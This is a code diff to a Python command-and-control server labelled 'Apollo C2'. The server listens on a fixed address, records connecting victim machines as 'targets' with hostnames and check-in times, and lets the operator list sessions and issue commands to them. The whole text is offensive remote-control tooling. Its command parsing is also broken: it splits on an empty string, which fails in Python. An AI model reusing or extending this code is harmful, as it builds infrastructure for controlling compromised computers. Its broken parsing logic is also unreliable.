@@ -1,14 +1,18 @@
 import socket
+import sys
 import threading
+import time
+from datetime import datetime
+from prettytable import PrettyTable
 
 def banner():
-    print('     ___                ____         _________   ')
-    print('    /   |  ____  ____  / / /___     / ____/__ \  ')
-    print('   / /| | / __ \/ __ \/ / / __ \   / /    __/ /  ')
-    print('  / ___ |/ /_/ / /_/ / / / /_/ /  / /___ / __/   ')
-    print(' /_/  |_/ .___/\____/_/_/\____/   \____//____/   ')
-    print('       /_/                                       ')
-    print('                                 By Luka Babetzki')
+    print('     ___                ____         _________    ')
+    print('    /   |  ____  ____  / / /___     / ____/__ \   ')
+    print('   / /| | / __ \/ __ \/ / / __ \   / /    __/ /   ')
+    print('  / ___ |/ /_/ / /_/ / / / /_/ /  / /___ / __/    ')
+    print(' /_/  |_/ .___/\____/_/_/\____/   \____//____/    ')
+    print('       /_/                                        ')
+    print('                                  By Luka Babetzki')
 
 
 def comm_in(targ_id):
@@ -51,9 +55,18 @@ def comm_handler(remote_target, remote_ip):
             break
         try:
             remote_target, remote_ip = sock.accept()
-            targets.append([remote_target, remote_ip[0]])
-            print(
-                f'\n[+] Connection received from {remote_ip[0]}\n' + 'Enter command#> ', end="")
+            cur_time = time.strftime("%H:%M:%S", time.localtime())
+            date = datetime.now()
+            time_record = (f"{date.month}/{date.day}/{date.year}/{cur_time}")
+            host_name = socket.gethostbyaddr(remote_ip[0])
+            if host_name is not None:
+                targets.append([remote_target, f"{host_name[0]}@{remote_ip[0]}", time_record])
+                print(
+                    f'\n[+] Connection received from {remote_ip[0]}\n' + 'Enter command#>', end="")
+            else:
+                targets.append([remote_target, remote_ip[0], time_record])
+                print(
+                    f'\n[+] Connection received from {remote_ip[0]}\n'+'Enter command#>', end="")
         except:
             pass
 
@@ -66,7 +79,7 @@ if __name__ == '__main__':
         host_ip = '192.168.1.66'
         host_port = 2222
     except IndexError:
-        print('\n[-] Command line arguement(s) missing. Please specify IP and Port.')
+        print('\n[!] Command line arguement(s) missing. Please specify IP and Port.')
     except Exception as e:
         print(e)
     listener_handler(host_ip, host_port, targets)
@@ -76,10 +89,13 @@ if __name__ == '__main__':
             if command.split("")[0] == 'sessions':
                 session_counter = 0
                 if command.split("")[1] == '-l':
-                    print('Session'+''*10+'Target')
+                    myTable = PrettyTable()
+                    myTable.field_names = ['Session','Status','Username','Target','Check-In Time']
+                    myTable.padding_width = 3
                     for target in targets:
-                        print(str(session_counter)+''*16+target[1])
+                        myTable.add_row([session_counter, 'Placeholder', 'Placeholder', target[1], target[2]])
                         session_counter +=1
+                    print(myTable)
                 if command.split("")[1]=='-i':
                     num = int(command.split("")[2])
                     targ_id = (targets[num])[0]
@@ -90,3 +106,4 @@ if __name__ == '__main__':
             sock.close()
             break
 
+# Example Input: 
